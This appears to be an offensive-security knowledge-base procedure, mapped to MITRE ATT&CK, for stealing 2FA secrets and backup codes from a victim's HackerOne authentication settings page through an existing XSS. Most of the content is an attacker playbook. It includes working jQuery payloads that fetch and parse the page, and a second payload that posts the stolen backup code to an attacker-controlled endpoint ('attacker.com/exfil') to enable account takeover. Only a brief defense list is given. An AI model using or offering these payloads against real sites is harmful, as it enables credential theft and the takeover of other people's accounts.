---
id: proc-uuid-2
tags:
  - xss
  - credential-theft
  - 2fa
  - information-disclosure
type: procedure
tools:
  - '[[tools/jQuery]]'
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands:
  - '[[commands/extract-2fa-backup-code-jquery]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Unsecured Credentials]]'
  - '[[Automated Collection]]'
updated_at: '2025-12-14T17:24:47.596Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Unsecured Credentials]]'
  - '[[Automated Collection]]'
---
# Extract-2FA-Secrets-Using-XSS-Payload

## Summary

This procedure uses an active XSS payload to fetch and parse the HackerOne authentication edit page, extracting pre-generated 2FA secret keys and backup codes exposed in the DOM.

## Description

HackerOne pre-generates 2FA secrets and backup codes, rendering them in the HTML of https://hackerone.com/settings/authentication/edit without password or TOTP confirmation. These persist across reloads until activated. Via XSS, the attacker makes an AJAX request to this page, parses the response DOM using selectors like #regenerate-backup-codes-authentication-modal li, and exfiltrates the values. This targets Ruby on Rails-based web sessions and requires an active XSS in the victim's browser.

## Requirements

1. Active XSS execution in victim's HackerOne session
2. Access to browser console or script injection
3. jQuery library availability (common in modern web apps)

## Defense

Defensive measures and detection strategies:

- Require authentication confirmation before rendering sensitive DOM elements
- Regenerate secrets on each page load
- Monitor for AJAX requests to internal auth endpoints from client-side scripts

## Objectives

1. Fetch the authentication edit page content
2. Parse and extract 2FA secrets/backup codes
3. Exfiltrate data for later use in account takeover

## Instructions

### Step 1: Inject Extraction Script

**Context**: Use the XSS to load jQuery if needed and execute the fetch.

**Command** ([[commands/extract-2fa-backup-code-jquery]]):
```javascript
$.get('https://hackerone.com/settings/authentication/edit').then(function(html){ console.log($(html).find('#regenerate-backup-codes-authentication-modal li:first').text()) })
```

> This command performs a GET request to the edit page, parses the HTML, finds the first li in the backup codes modal, and logs the text (e.g., a code like '37d4 f16d ad0e a6b2'). Repeat to confirm persistence.

### Step 2: Exfiltrate Data

**Context**: Send extracted values to attacker server.

Modify the script to include a POST to an external endpoint:
```javascript
$.get('https://hackerone.com/settings/authentication/edit').then(function(html){ var code = $(html).find('#regenerate-backup-codes-authentication-modal li:first').text(); $.post('https://attacker.com/exfil', {code: code}); })
```

> Expected: Server receives the backup code or secret without victim notice.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]
- [[Unsecured Credentials]]
- [[Automated Collection]]

### Sub-Techniques


## Commands Used

- [[commands/extract-2fa-backup-code-jquery]]

## Tools Used

- [[tools/jQuery]]

## Tags

- [[xss]]
- [[credential-theft]]
